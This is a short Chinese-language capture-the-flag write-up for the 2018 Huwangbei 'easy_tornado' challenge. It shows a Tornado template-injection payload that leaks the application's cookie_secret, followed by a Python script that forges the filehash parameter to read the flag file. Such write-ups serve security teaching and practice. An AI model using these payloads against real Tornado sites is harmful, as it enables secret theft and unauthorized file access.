# [护网杯 2018]easy_tornado

## 知识点

`tornado模板注入`

## 解题

`error?msg={{1}}`

存在`msg`参数，百度之后发现师傅们可以进行模块注入。尝试了`error?msg={{1}}`，发现的确存在模块注入。然后我们尝试用`+-*/`发现都报错，应该是被`过滤`了。

而我们查官方文档，`tornado`在搭建一个网站时，肯定会有多个`handler`，而这些`handler`都是`RequestHandler`的子类

`RequestHandler.settings`又指向`self.application.settings`

所以我们可以说`handler.settings`指向了`RequestHandler.settings`了，对吧

这样我们就可以构造一下`payload`：`?msg={{handler.settings}}`

拿到`cookie_secret`之后的`exp`

```python
import hashlib
cookie='fef4cbca-8841-4c4e-9d69-7c20990a6d11'
file_filename='/fllllllllllllag'
md5_filename=hashlib.md5(file_filename.encode(encoding='UTF-8')).hexdigest()
word=cookie+md5_filename
filehash=hashlib.md5(word.encode(encoding='UTF-8')).hexdigest()
print(filehash)
```

`payload`

`?filename=/fllllllllllllag&filehash=c61c635cb683b21a9f39fdf1af9ca9e8`

[参考文章](https://www.cnblogs.com/junlebao/p/13819357.html)